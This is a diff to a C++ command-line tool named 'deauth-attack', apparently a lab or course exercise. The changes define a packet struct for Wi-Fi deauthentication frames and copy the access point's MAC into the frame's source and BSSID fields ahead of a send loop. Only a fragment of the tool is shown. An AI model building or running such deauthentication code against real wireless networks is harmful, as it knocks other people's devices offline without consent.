@@ -3,6 +3,12 @@
 #include <stdio.h>
 #include <header.h>
 
+struct Deauth_packet final{
+    Radiotaps r_tap;
+    Deaut_frame d_frame;
+    Fixed_param fixed_param;
+};
+
 void usage()
 {
     std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << std::endl;
@@ -48,9 +54,10 @@ int main(int argc, char *argv[])
             return -1;
     }
 
-    Deauth_packet packets;
+    struct Deauth_packet packets;
     for(i=0; i<6; i++) {
-        packets.d_frame.trans_src_bssid_addr[i] = ap_mac[i];
+        packets.d_frame.trans_src_addr[i] = ap_mac[i];
+        packets.d_frame.bssid_addr[i] = ap_mac[i];
     }
 
     while(true) {
